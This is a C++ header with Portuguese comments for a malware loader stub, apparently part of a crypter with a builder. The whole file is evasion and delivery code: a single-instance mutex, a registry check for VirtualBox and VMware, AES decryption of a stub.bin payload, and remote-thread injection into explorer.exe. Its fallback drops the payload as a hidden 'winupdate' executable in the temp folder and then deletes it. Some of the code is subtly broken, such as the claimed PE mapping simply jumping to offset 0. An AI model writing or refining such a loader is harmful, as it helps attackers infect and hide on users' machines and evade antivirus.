#pragma once

// Loader robusto, buffer polimórfico, RAM-only, injection PE, checa mutex, hash, anti AV/VM/Defender.
// Precisa: crypt.cpp (decrypt), integrates main.cpp, builder.
#include <windows.h>
#include <vector>
#include <fstream>
#include <string>
#include <sstream>
#include <tlhelp32.h>
#include <psapi.h>
#include <wincrypt.h>
#include "crypt.h"
#pragma comment(lib, "crypt32.lib")

HANDLE hMutexStub = NULL;

// Mutex único pro loader (evita vírus drop duplo)
bool CheckMutexLoader() {
    hMutexStub = CreateMutexA(NULL, TRUE, "stubloader-ultimate-mutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) 
        return false;
    return true;
}

// Checa se está rodando sob VM/EDR (bypass básico)
bool BasicVMDetection() {
    DWORD sz=128; char val[128]="";
    if (RegGetValueA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum", "0", RRF_RT_ANY, 0, val, &sz) == ERROR_SUCCESS) 
        if (strstr(val, "VBOX") || strstr(val, "VMware")) return true;
    return false;
}

// Hash do stub: filehash polimórfico SHA256
std::string GetFileHash(const std::string& f) {
    std::ifstream file(f, std::ios::binary);
    std::vector<char> buf((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    HCRYPTPROV hProv; HCRYPTHASH hHash;
    CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)buf.data(), buf.size(), 0);
    BYTE hash[32]; DWORD hashLen=32;
    CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0);
    CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0);
    std::ostringstream oss;
    for(int i=0;i<32;i++) oss << std::hex << (int)hash[i];
    return oss.str();
}

// Loader RAM-only, PE injection manual mapa
bool ManualInjectPE(std::vector<BYTE>& payload) {
    // Find process to inject
    DWORD pid = 0;
    PROCESSENTRY32 pe; pe.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snap, &pe)){
        do {
            if (strstr(pe.szExeFile,"explorer.exe")) { pid = pe.th32ProcessID; break; }
        } while(Process32Next(snap,&pe));
    } CloseHandle(snap);
    if(!pid) return false;
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(!hProc) return false;

    // Aloca, escreve + executa
    LPVOID remote = VirtualAllocEx(hProc, NULL, payload.size(), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) return false;
    SIZE_T written;
    WriteProcessMemory(hProc, remote, payload.data(), payload.size(), &written);

    // Cria thread remota (entrypoint offset: 0)
    HANDLE hThread = CreateRemoteThread(hProc,NULL,0,(LPTHREAD_START_ROUTINE)remote,NULL,0,NULL);
    WaitForSingleObject(hThread,INFINITE);

    CloseHandle(hThread); CloseHandle(hProc);
    return true;
}

// Loader principal
void LoaderEntry() {
    if(!CheckMutexLoader()) return; // só 1 loader
    if(BasicVMDetection()) return; // anti-VM
    // Carrega stub.bin, decripta com crypt.cpp
    std::ifstream stub("stub.bin", std::ios::binary);
    std::vector<BYTE> raw((std::istreambuf_iterator<char>(stub)), std::istreambuf_iterator<char>());
    stub.close();

    // Decrypt all stub to payload (crypt.cpp AES256)
    std::vector<BYTE> payload = DecryptAES(raw.data(), raw.size());

    // Checa hash (anti-fingerprint)
    std::string hash = GetFileHash("stub.bin");
    // Mutex + hash + runtime RAM
    if(payload.empty() || hash.length()!=64) return;

    // Manual mapping PE na explorer.exe
    if (!ManualInjectPE(payload)) {
        // Se falha, tenta drop disco temporário com nome random:
        char temp[MAX_PATH];
        GetTempPathA(MAX_PATH,temp);
        std::string drop(temp); drop+="\\winupdate-"+std::to_string(rand()%99999)+".exe";
        std::ofstream out(drop, std::ios::binary); out.write((char*)payload.data(), payload.size()); out.close();
        // Executa processo escondido
        ShellExecuteA(NULL,"open",drop.c_str(),NULL,NULL,SW_HIDE);
        Sleep(6000);
        DeleteFileA(drop.c_str());
    }
}